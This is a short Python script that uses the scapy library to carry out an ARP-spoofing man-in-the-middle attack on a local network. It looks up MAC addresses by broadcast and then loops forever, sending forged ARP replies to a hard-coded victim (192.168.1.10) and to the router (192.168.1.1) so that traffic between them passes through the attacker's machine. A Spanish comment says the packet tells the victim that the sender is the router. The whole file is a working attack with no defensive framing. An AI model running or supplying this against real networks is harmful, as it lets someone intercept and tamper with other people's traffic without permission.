import time
import scapy.all as scapy 


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
   #Se esta enviando un paquete a la victima anunciandole que es el router
    packet = scapy.ARP(op = 2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet) 
    
get_mac("192.168.1.1", )

while True:
    spoof("192.168.1.10", "192.168.1.1")
    spoof("192.168.1.1", "192.168.1.10")
    time.sleep(2)
